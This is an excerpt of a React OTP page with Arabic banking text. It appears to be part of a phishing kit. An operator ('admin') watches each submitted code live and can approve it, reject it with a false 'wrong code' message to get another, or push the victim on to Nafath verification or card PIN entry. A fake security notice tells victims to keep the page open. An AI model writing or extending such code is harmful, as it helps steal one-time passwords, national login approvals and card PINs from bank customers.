  ...
  useEffect(() => {
    ...
    const interval = setInterval(async () => {
      try {
        ...
        if (!res.ok) {
          console.warn('Could not check status in OTPPage, retrying...', res.status);
          return;
        }
        ...
        if (isMounted) {
          if (updatedTx.status === 'APPROVED') {
            ...
            setIsVerified(true);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/otp');
            ...
            // Revert back to editing if admin requests a new code
            setOtpStatus('editing');
            setOtp(Array(6).fill(''));
            setError('الرمز المدخل غير صحيح. يرجى التحقق من الرسالة النصية وإدخال الرمز الجديد.');
          } else if (updatedTx.status === 'AWAITING_NAFATH') {
            // Admin explicitly requested Nafath verification
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/otp');
            ...
            // Admin explicitly requested Card PIN verification
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/otp');
        ...
        console.warn('Polling network warning in OTPPage, retrying...', err);
      }
    }, 2000);
        ...
        {otpStatus === 'submitted' ? (
          <div className="space-y-6 text-center py-6">
            ...
            <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
              تم إرسال رمز التحقق إلى 313131 بأمان لضمان سلامة وأمان المعاملة المصرفية.
            </p>
            ...
            <div className="rounded-xl bg-slate-50 border border-slate-100 p-4 text-right dir-rtl text-[11px] space-y-1.5 text-slate-600">
              <p className="font-extrabold text-emerald-800 flex items-center gap-1.5 mb-2">
                <ShieldAlert className="h-4 w-4 text-emerald-600" />
                <span>إشعار الأمان والحماية:</span>
              </p>
              <p>• يرجى إبقاء هذه الصفحة مفتوحة حتى يتم التأكد من صحة رمز الأمان المدخل واكتمال عملية الدفع بأمان.</p>
              <p>• تجنب إغلاق المتصفح أو الضغط على زر التحديث لضمان عدم تكرار عملية الخصم المصرفي.</p>
              <p>• سيتم تحويلك تلقائياً فور استلام التأكيد النهائي من نظام المدفوعات الوطني الآمن.</p>
            </div>
          </div>
        ) : (
          <>
